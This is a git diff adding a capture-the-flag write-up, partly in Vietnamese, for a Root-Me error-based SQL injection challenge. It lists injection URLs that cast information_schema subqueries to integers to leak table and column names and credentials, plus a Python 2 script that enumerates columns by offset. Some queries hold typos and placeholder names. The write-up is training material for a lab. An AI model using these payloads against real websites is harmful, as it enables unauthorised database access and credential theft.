@@ -61,4 +61,24 @@
 ## [SQL injection – Error]
 ### Steps to reproduce
 - `http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC'` --> error --> sql injection
-- 
+- `http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC', (CAST((select table_name form information_schema.tables) as int)) -- ` --> error chỉ hiện thị 1 dòng
+- `http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC', (CAST((select table_name form information_schema.tables limit 0,1) as int)) -- ` --> lỗi sử dụng `offset`
+- `http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC', (CAST((select table_name form information_schema.tables limit 1 offset 0) as int)) -- ` --> tim được table_name
+- `http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC', (CAST((select column_name form information_schema.columns limit 1 offset 0) as int)) -- ` --> tim được column `id` hơi nhọc nên fuzz cho nhanh
+```
+import requests
+import sys
+
+URL = "http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC"
+
+for i in range(0,1000):
+	query ='ASC, (CAST((select column_name from information_schema.columns limit 1 offset ' + str(i) + ') as int))--'
+	PARAMS ={'action':'contents','order':query}
+	http  = requests.get(url = URL,params = PARAMS)
+	content = http.content
+	content = content.replace("</body></html>","")
+	print "column of table is :" + content[441:]
+```
+- Tìm được column
+- `http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC', (CAST((select userafa form fsafsdasf limit 1 offset 0) as int)) -- ` --> tìm username
+- pass tương tự.
